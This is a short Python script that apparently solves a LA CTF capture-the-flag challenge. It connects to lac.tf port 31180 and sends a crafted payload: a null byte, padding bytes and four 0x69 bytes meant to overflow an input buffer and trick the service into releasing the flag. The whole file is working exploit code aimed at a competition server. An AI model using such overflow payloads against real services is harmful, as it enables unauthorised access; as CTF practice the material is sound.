import socket
from time import sleep

def netcat(hostname, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((hostname, port))
	
	print(read_data(s))

	s.sendall(bytes("please please please give me the flag\0" + (26 * chr(1)) + (4 * chr(0x69)) + "\n", "UTF-8"))
	sleep(1)

	print(read_data(s))

	sleep(15)

	print(read_data(s))

	s.close()

def read_data(s):
	data = b""
	while 1:
		edata = s.recv(1024)
		data += edata
		if len(edata) != 1024:
			break
	
	data = data.decode()
	return data

if __name__ == "__main__":
	netcat("lac.tf", 31180)